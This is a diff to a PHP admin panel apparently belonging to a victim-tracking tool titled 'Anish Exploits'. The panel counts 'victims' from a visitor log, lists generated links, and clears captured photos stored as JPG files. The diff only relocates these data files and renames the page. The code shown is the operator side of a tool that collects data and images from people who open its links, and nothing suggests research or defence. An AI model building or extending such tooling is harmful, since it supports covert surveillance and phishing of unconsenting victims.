@@ -41,14 +41,14 @@ if (!isset($_SESSION['admin']) || $_SESSION['admin'] !== true) {
     exit;
 }
 
-$visitors = file_exists('/tmp/visitors.json') ? json_decode(file_get_contents('/tmp/visitors.json'), true) : [];
-$links = file_exists('/tmp/links.json') ? json_decode(file_get_contents('/tmp/links.json'), true) : [];
+$visitors = json_decode(file_get_contents("visitors.json"), true) ?? [];
+$links = json_decode(file_get_contents("links.json"), true) ?? [];
 $totalVictims = count($visitors);
 ?>
 <!DOCTYPE html>
 <html>
 <head>
-    <title>DATABASE</title>
+    <title>Admin - Anish Exploits</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body { background: #0f0c29; color: white; font-family: Arial; padding: 20px; }
@@ -118,9 +118,9 @@ $totalVictims = count($visitors);
     
     // Clear all
     if (isset($_GET['clear'])) {
-        file_put_contents("/tmp/visitors.json", json_encode([]));
-        file_put_contents("/tmp/links.json", json_encode([]));
-        $files = glob("/tmp/photos/*.jpg");
+        file_put_contents("visitors.json", json_encode([]));
+        file_put_contents("links.json", json_encode([]));
+        $files = glob("photos/*.jpg");
         foreach ($files as $file) @unlink($file);
         echo "<script>location.href='?'</script>";
         exit;
